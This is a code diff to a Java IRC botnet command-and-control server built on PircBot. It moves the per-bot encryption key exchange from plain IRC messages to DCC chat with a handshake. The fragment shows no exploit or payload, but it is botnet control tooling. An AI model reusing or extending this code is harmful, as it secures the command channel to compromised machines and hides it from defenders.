@@ -148,7 +148,7 @@ public class BotnetServer extends PircBot {
 				PubInfo info = MsgEncrypt.getPubParams();
 				MsgEncrypt m = MsgEncrypt.getInstance();
 				m.setPubParams(info.toString());
-				String stuff = "key " + m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::") + " " + info.toString();
+				//String stuff = "key " + m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::") + " " + info.toString();
 				//System.out.println(stuff.length() + " " + stuff.replace("\\", "\\\\").split("\n").length);
 				//System.out.println(Arrays.toString(stuff.split("\n")));
 				//String stuff2 = "";
@@ -157,18 +157,23 @@ public class BotnetServer extends PircBot {
 				//} 
 				//System.out.println("\n\n:" + stuff2 + ":\n\n");
 				//sendMessage(bots[i].getNick(), stuff2);
-				sendMessage(bots[i].getNick(), stuff);
-				botKeys.put(bots[i].getNick(), m);
+				//sendMessage(bots[i].getNick(), stuff);
+				//botKeys.put(bots[i].getNick(), m);
 				try {
 					DccChat chat = dccSendChatRequest(bots[i].getNick(), TIMEOUT);
 					if (chat == null) {
 						System.out.println("\tThe chat request was rejected.");
 					} else {
 						chat.sendLine("key");
-						Scanner shellout = new Scanner(chat.getBufferedReader());
 						//use shellout for getting returned data from the client if you need it
 						//use chat.sendLine(s) to send key info
+						chat.sendLine(m.getStrKey()); // send key
+						chat.sendLine(info.toString()); // send public info
+						String otherKey = chat.readLine(); // get public key
+						m.handShake(otherKey);
+						botKeys.put(bots[i].getNick(), m);
 					}
+					chat.close();
 				} catch (Exception e) {
 					System.out.println("\tThere was an issue performing the key exchange");
 					e.printStackTrace();
